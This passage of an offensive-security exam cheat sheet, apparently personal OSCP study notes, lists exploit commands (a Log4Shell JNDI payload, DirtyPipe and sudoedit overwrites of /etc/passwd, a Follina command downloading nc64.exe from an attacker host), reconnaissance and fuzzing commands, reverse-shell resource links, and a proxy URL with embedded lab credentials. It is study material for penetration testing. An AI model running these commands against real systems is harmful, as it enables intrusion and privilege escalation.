+${jndi:ldap://&lt;LHOST&gt;:1389/foobar}
+
+# CVE-2022-0847: DirtyPipe
+gcc -o dirtypipe dirtypipe.c
+./dirtypipe /etc/passwd 1 ootz:
+su rootz
+
+# CVE-2023-22809: Sudo Bypass
+EDITOR=&quot;vi -- /etc/passwd&quot; sudoedit /etc/motd
+
+# CVE-2022-30190: Follina
+python3 follina.py -p 80 -c &#x27;powershell.exe Invoke-WebRequest http://&lt;LHOST&gt;:8000/nc64.exe -outfile C:\nc.exe&#x27;</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-80e2-b08d-d53caa0c171e"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-801e-89d0-d1330d506b67" class="">Fixing Exploits</h2></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80ef-b1ae-eddbd1a15b18" class=""><strong>Cross-Compiling Exploit Code</strong></p></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8002-ab66-e19c084c2098" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sudo apt install mingw-w64
+
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+
+</code></pre></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-804d-9fef-d5edc6a50f1a" class="">📝 OSINT Tools</h2></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-807f-9782-f4eba9180cf1" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Recon-ng
+recon-ng
+&gt; marketplace install all
+&gt; workspace create &lt;NAME&gt;
+
+# theHarvester
+theHarvester -d example.com -b google,bing,linkedin
+
+# Useful resources
+# &lt;https://hunter.io/&gt; - Email lookup
+# &lt;https://phonebook.cz/&gt; - Domain/Email/URL lookup
+# &lt;https://osintframework.com/&gt; - Complete OSINT framework</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-801a-975d-eb2976f6f474"/></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-80bf-babe-f25c3459897a"/></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80ae-b63c-e5c2769f6358" class="">Metasploit Rule</h3></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-80d9-905d-ee33b2573a8a" class="bulleted-list"><li style="list-style-type:disc">✓ <code>msfvenom</code> → use freely on ALL machines (payload gen only)</li></ul></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-80a1-aa4c-d4fd8ee7ed5f" class="bulleted-list"><li style="list-style-type:disc">✓ Metasploit → EXACTLY 1 machine — choose wisely</li></ul></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-808d-94d6-d29f5e26596d" class="bulleted-list"><li style="list-style-type:disc">✗ Metasploit → CANNOT use on more than 1 machine ( don’t use on AD)</li></ul></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-80f6-9263-ea6bbf106537" class="bulleted-list"><li style="list-style-type:disc">✓ Manual exploits → unlimited</li></ul></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-80d7-8cfc-c9e6407d5ed5"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-8079-ad34-c6f4b1e3370e" class="">📸 Proof Collection Commands</h2></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8062-b694-c6d88d47485b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Linux local.txt (unprivileged)
+whoami
+cat local.txt
+ifconfig
+
+# Linux proof.txt (root)
+cd /root
+whoami
+cat proof.txt
+ifconfig
+
+
+# Windows local.txt
+whoami &amp; type local.txt &amp; ipconfig 
+
+# Windows proof.txt (SYSTEM / Administrator)
+cd C:\Users\Administrator\Desktop
+
+whoami &amp; type proof.txt &amp; ipconfig 
+</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-8047-9093-e393cfcda8de"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-80d3-ba19-fe41fd24e02a" class="">📚 Key Resources</h2></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8083-8727-ece0c4fb7321" class="bulleted-list"><li style="list-style-type:disc"><a href="https://gtfobins.org/">https://gtfobins.org/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8071-babe-fdf6479591dc" class="bulleted-list"><li style="list-style-type:disc"><a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-8011-ab20-ef4d0a5a2aee" class="bulleted-list"><li style="list-style-type:disc"><a href="https://wadcoms.github.io/">https://wadcoms.github.io/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80ab-bb25-f3a43c9b9230" class="bulleted-list"><li style="list-style-type:disc"><a href="https://arttoolkit.github.io/">https://arttoolkit.github.io/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="386a083f-29df-8033-bdc9-f72e4cbb17d7" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/strikoder/windows-binaries">https://github.com/strikoder/windows-binaries</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8083-891d-c0532eaaf1fd" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.revshells.com/">https://www.revshells.com/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8043-8320-c36735624b92" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/Pwn3rx0/Obfuscated-PS-Reverse-Shell">https://github.com/Pwn3rx0/Obfuscated-PS-Reverse-Shell</a></li></ul></div><div style="display:contents" dir="auto"><ul id="386a083f-29df-8039-a9f5-c2a0bbce21e9" class="bulleted-list"><li style="list-style-type:disc"><a href="https://pentestmonkey.net/tag/reverseshell">https://pentestmonkey.net/tag/reverseshell</a></li></ul></div><div style="display:contents" dir="auto"><ul id="386a083f-29df-80e9-9cd5-c6cc76f5a08e" class="bulleted-list"><li style="list-style-type:disc"><a href="https://explainshell.com/">https://explainshell.com/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-8014-9d91-cf69aee989d4" class="bulleted-list"><li style="list-style-type:disc"><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8048-b07b-de089d934ad5" class="bulleted-list"><li style="list-style-type:disc"><a href="https://emn178.github.io/online-tools/">https://emn178.github.io/online-tools/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="386a083f-29df-8023-a45b-de1bd81c7f34" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.url-encode-decode.com/">https://www.url-encode-decode.com/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-802e-813b-d52853382c70" class="bulleted-list"><li style="list-style-type:disc"><strong>HackTricks:</strong> <a href="https://hacktricks.wiki/en/index.html">https://hacktricks.wiki/en/index.html</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8093-b617-cf2fd72fd78d" class="bulleted-list"><li style="list-style-type:disc"><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li></ul></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-80d5-95d1-db3d495bfabd" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li></ul></div><div style="display:contents" dir="auto"><ul id="384a083f-29df-8065-b5dc-f8d89ce36571" class="bulleted-list"><li style="list-style-type:disc"><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/">https://swisskyrepo.github.io/PayloadsAllTheThings/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8047-8579-d768f6da9f08" class="bulleted-list"><li style="list-style-type:disc"><a href="https://swisskyrepo.github.io/InternalAllTheThings/">https://swisskyrepo.github.io/InternalAllTheThings/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80ae-8597-c0c497cfbac9" class="bulleted-list"><li style="list-style-type:disc"><a href="https://hacktricks.wiki/en/index.html">https://hacktricks.wiki/en/index.html</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80cc-88e5-faf248d8c1b2" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.thehacker.recipes/">https://www.thehacker.recipes/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-809f-ac80-ee0469e38f9d" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.hackingarticles.in/">https://www.hackingarticles.in/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8027-ac71-c1bb9966291b" class="bulleted-list"><li style="list-style-type:disc"><a href="https://powersploit.readthedocs.io/en/latest/">https://powersploit.readthedocs.io/en/latest/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80e2-aa04-cba61c3e1f21" class="bulleted-list"><li style="list-style-type:disc"><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80b3-b1e2-f7ebbff93d83" class="bulleted-list"><li style="list-style-type:disc"><a href="https://kypvas.github.io/ad_attack_architecture/">https://kypvas.github.io/ad_attack_architecture/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80c9-8012-eee887462077" class="bulleted-list"><li style="list-style-type:disc"><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/">https://orange-cyberdefense.github.io/ocd-mindmaps/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8038-9a07-c86c16d978e9" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sploitus.com/">💀 Sploitus | Exploits &amp; Tools Search Engine</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80d6-a897-d50940a3f8c2" class="bulleted-list"><li style="list-style-type:disc"><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8084-9c2b-ec208dbd109a" class="bulleted-list"><li style="list-style-type:disc"><a href="https://web-check.xyz/">https://web-check.xyz/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-807b-a73f-d0b22e507d92" class="bulleted-list"><li style="list-style-type:disc"><a href="https://pastebin.com/u/cyberoot">https://pastebin.com/u/cyberoot</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80bc-b70b-d15eb47a2904" class="bulleted-list"><li style="list-style-type:disc"><a href="https://app.interactsh.com/">https://app.interactsh.com/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8086-9de7-c4d799967314" class="bulleted-list"><li style="list-style-type:disc"><a href="https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html#sql-injection-to-rce">https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html#sql-injection-to-rce</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8034-9c70-d0618c75e60a" class="bulleted-list"><li style="list-style-type:disc"><a href="https://lorenzomeacci.com/advanced-initial-access-techniques">https://lorenzomeacci.com/advanced-initial-access-techniques</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-808c-8020-e61a257e0151" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/notthehiddenwiki/NTHW">https://github.com/notthehiddenwiki/NTHW</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-802b-875c-d711cc245195" class="bulleted-list"><li style="list-style-type:disc"><a href="https://msrc.microsoft.com/update-guide/vulnerability">https://msrc.microsoft.com/update-guide/vulnerability</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-8002-b4f5-df82341df4f0" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/x1xhlol/system-prompts-and-models-of-ai-tools">https://github.com/x1xhlol/system-prompts-and-models-of-ai-tools</a></li></ul></div><div style="display:contents" dir="auto"><ul id="385a083f-29df-80f0-b662-db1dcb0a4366" class="bulleted-list"><li style="list-style-type:disc"><a href="https://arcanum-sec.github.io/P4RS3LT0NGV3/">https://arcanum-sec.github.io/P4RS3LT0NGV3/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="386a083f-29df-807f-9bf6-e829a168c72d" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></li></ul></div><div style="display:contents" dir="auto"><ul id="386a083f-29df-808a-8417-c0c7f34383c3" class="bulleted-list"><li style="list-style-type:disc"><a href="https://rot13.com/">https://rot13.com/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="386a083f-29df-80af-a4a6-f0e3b6e5c61e" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.bf.doleczek.pl/">https://www.bf.doleczek.pl/</a></li></ul></div><div style="display:contents" dir="auto"><ul id="386a083f-29df-8012-bf80-e3fd9dcb9ba6" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.cachesleuth.com/multidecoder/">https://www.cachesleuth.com/multidecoder/</a></li></ul></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8003-b9fe-ea7a67d73ef5" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="385a083f-29df-8055-a5d0-dc13b3ee5924" class="">📚 Key Resources OSCP</h2></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80e2-9697-de426789b206" class=""><a href="https://notchxor.github.io/oscp-notes/">Hack The Planet</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80b4-a5ec-f6f0fc007601" class=""><a href="https://xn--ec6b17t.com/OSCP/OSCP-Cheatsheet">https://xn--ec6b17t.com/OSCP/OSCP-Cheatsheet</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80b8-97de-ec1ba3bcc138" class=""><a href="https://pentestmindmap.com/oscp-cheatsheet">https://pentestmindmap.com/oscp-cheatsheet</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80ea-b3f9-d68d40bac176" class=""><a href="https://hackerask.com/posts/pentesting-cheatsheet/">https://hackerask.com/posts/pentesting-cheatsheet/</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8012-ad65-c1abe3a62682" class=""><a href="https://s4thv1k.com/posts/oscp-cheatsheet/">https://s4thv1k.com/posts/oscp-cheatsheet/</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80ee-8286-dd023a3ca813" class=""><a href="https://hackwithmike.com/oscp/methodology">https://hackwithmike.com/oscp/methodology</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80f7-8d04-d9f293a2d14a" class=""><a href="https://github.com/0xsyr0/OSCP">https://github.com/0xsyr0/OSCP</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80b8-a954-fadb29cb6e9a" class=""><a href="https://github.com/rodolfomarianocy/OSCP-Tricks">https://github.com/rodolfomarianocy/OSCP-Tricks</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8048-9f2a-c993ff53c4a3" class=""><a href="https://github.com/strikoder/OffensiveSecurityScripts/tree/main/Scripts/enum">https://github.com/strikoder/OffensiveSecurityScripts/tree/main/Scripts/enum</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8044-a40a-e0eb34948f1c" class=""><a href="https://0xb0b.gitbook.io/writeups">https://0xb0b.gitbook.io/writeups</a></p></div><div style="display:contents" dir="auto"><h2 id="385a083f-29df-809a-b21f-e28734b0efe4" class="">📚 The Art of AD</h2></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8090-a240-cc4e78f8659a" class=""><a href="https://breachforce.net/active-directory-enumeration-1">https://breachforce.net/active-directory-enumeration-1</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8024-b701-cb45be45c247" class=""><a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-80d2-a0dd-db39a7d57d2f" class=""><a href="https://www.macksofytrainings.com/windows-ad-attack-cheatsheet-2026/">https://www.macksofytrainings.com/windows-ad-attack-cheatsheet-2026/</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80e8-b526-fb887ca18525" class=""><a href="https://pentest.zishanhack.com/notes/ActiveDirectory.html">https://pentest.zishanhack.com/notes/ActiveDirectory.html</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8036-b267-e82576ffa7c7" class=""><a href="https://vanakkam-nanba.github.io/offsec/redteam-enumeration/#basic-enumeration">https://vanakkam-nanba.github.io/offsec/redteam-enumeration/#basic-enumeration</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8092-b052-d44726589018" class=""><a href="https://www.hackingarticles.in/ai-powered-active-directory-pentesting-with-claude-hexstrike-ai-netexec/">https://www.hackingarticles.in/ai-powered-active-directory-pentesting-with-claude-hexstrike-ai-netexec/</a> </p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8011-8ce0-ea3e31261fcd" class=""><a href="https://notes.subh.space/kerberos-attacks/asreproasting">https://notes.subh.space/kerberos-attacks/asreproasting</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8078-a0e7-c3e77e0a6491" class=""><a href="https://medium.com/@MEGAZORDI/windows-privilege-escalation-cheat-sheet-e6272b6c9dfc">https://medium.com/@MEGAZORDI/windows-privilege-escalation-cheat-sheet-e6272b6c9dfc</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8090-92e3-ee660d2ec698" class=""><a href="https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/index.html">ADCS Attacks with Certipy</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80ff-a886-da33ba2c2df9" class=""><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">06 ‐ Privilege Escalation</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8079-8919-d820b36aa005" class=""><a href="https://github.com/SpecterOps/BloodHound-Legacy">https://github.com/SpecterOps/BloodHound-Legacy</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8012-9a2a-d322dfc2199d" class=""><a href="https://github.com/SpecterOps/BloodHound">https://github.com/SpecterOps/BloodHound</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80ae-b82a-c477a4a49343" class=""><a href="https://bloodhound.specterops.io/resources/edges/generic-all">https://bloodhound.specterops.io/resources/edges/generic-all</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8087-a9d8-ef3ccf284e28" class=""><a href="https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad#bkmrk-retrieve-user-inform">BloodyAD | ADMinions</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-809d-a8fa-e58c33a8e97f" class=""><a href="https://blog.gzzcoo.com/posts/bloodyAD/">bloodyAD</a></p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80ba-9a56-ffae97bb55a0" class=""><a href="https://seriotonctf.github.io/BloodyAD-Cheatsheet/">https://seriotonctf.github.io/BloodyAD-Cheatsheet/</a></p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-803c-9231-c43131accb75" class="">bloodyAD set object -h</p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80d1-bffe-f79d9e463d44" class="">
+</p></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-807d-8ac5-f08144f1e167"/></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8053-a512-c60c56eb85b6" class="">
+</p></div><div style="display:contents" dir="auto"><h1 id="386a083f-29df-8094-8e0b-f52d9b760ba9" class="">Fuzzing</h1></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8087-b3a9-da4ef4247421" class="">
+</p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-802c-8aeb-fb89c1bdc20c" class=""><a href="https://wordlists-cdn.assetnote.io/data/automated/">https://wordlists-cdn.assetnote.io/data/automated/</a></p></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-8055-86d2-d25f3f603ca8" class=""><strong>Web Content Discovery (Directories &amp; Files)</strong></h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-804e-8fe6-e4251083fd5d" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+/usr/share/seclists/Discovery/Web-Content/spring-boot.txt
+/usr/share/seclists/Discovery/Web-Content/quickhits.txt</code></pre></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-80be-80a0-ec3fdf5ae1a2"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-8078-aa59-fb34244c0521" class=""><strong><br/>passwordlist</strong></h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80f3-8584-f7c0f7d2af24" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">/usr/share/wordlists/fasttrack.txt
+/usr/share/wordlists/metasploit/unix_users.txt
+/usr/share/wordlists/rockyou.txt
+/usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt
+ls /usr/share/seclists/Passwords/</code></pre></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8003-bbc3-f91f53222573" class=""><strong><br/>wordpress</strong></p></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8062-80a9-c63f3166a703" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt</code></pre></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8079-a2f9-f4f1ff304b91" class="">
+</p></div><div style="display:contents" dir="auto"><p id="386a083f-29df-8059-be46-f5a254c8a550" class=""><strong>DNS / Subdomain Discovery</strong></p></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80c8-a62d-fb7d0efffa39" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
+/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code></pre></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-8095-ade5-e5d03a93889b"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-80fe-b2b3-f22b274015f6" class=""><strong>Username Discovery</strong></h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-806d-b46c-d4736c8c2827" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+/usr/share/seclists/Usernames/Names/names.txt</code></pre></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-8004-91e8-f6fd0e02acc5"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-8088-828e-fd6fdbfdbac8" class=""><strong>Misc Wordlists </strong></h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80af-95fc-ca3bd4bfe123" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/spiderfoot/spiderfoot/dicts/subdomains.txt</code></pre></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-80a0-bb93-fbcd61b07d05"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-80ff-9273-d17754537fa1" class=""><strong>Example Commands</strong></h2></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-80b1-bd02-cb85abc5ea42"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-8024-bcd5-d711028ef8b2" class="">Feroxbuster </h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80be-96c4-f45ddb16aa26" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">feroxbuster -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80b2-a70e-fc0afe875581" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">feroxbuster -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-805e-8255-e5fd994e74d3" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">feroxbuster -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -q -C 404,403 -x php,html,txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8089-af62-c8d54de3ace9" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">feroxbuster -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-80ba-8989-f4481df123f0"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-8003-b7d9-dee13864280f" class="">Gobuster </h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8039-be8a-fe3ac4ebf37a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://example.com -x php</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80ad-804e-e88be75d9c2b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8021-8bf6-e3244dc049ef" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u http://example.com --wordlist=/usr/share/wordlists/dirb/common.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8033-aa9f-f42cd78d834f" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80be-8d25-fac6eed5a8ca" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster vhost -q -u http://example.com --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80a9-a15d-f21811312006" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u http://example.com -x php</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8042-be63-e7eee04d87a2" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u http://example.com/admin/ -x php -c &quot;PHPSESSID=k6khfp0o2ebg09u222rj2vtqh6&quot;</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80d1-82d5-d7f0e6bf0733" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u http://example.com/ -w /usr/share/wordlists/dirb/common.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8081-9ee9-ec448c935038" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u http://example.com/dev -w /usr/share/wordlists/dirb/common.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80af-833d-e314aa935778" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u http://127.0.0.1 --proxy &#x27;http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.120.143:3128&#x27; -w /usr/share/wordlists/dirb/common.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80fc-89c6-d90aad6cac93" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -q -u http://127.0.0.1/app --proxy &#x27;http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.120.143:3128&#x27; -w /usr/share/wordlists/dirb/common.txt -x py</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8053-8c75-c47545aaeabb" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://example.com/ -t 50</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8029-9b01-e69c11493279" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://example.com/portal -t 50 -x php</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-808c-85ea-d332a040d35c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir 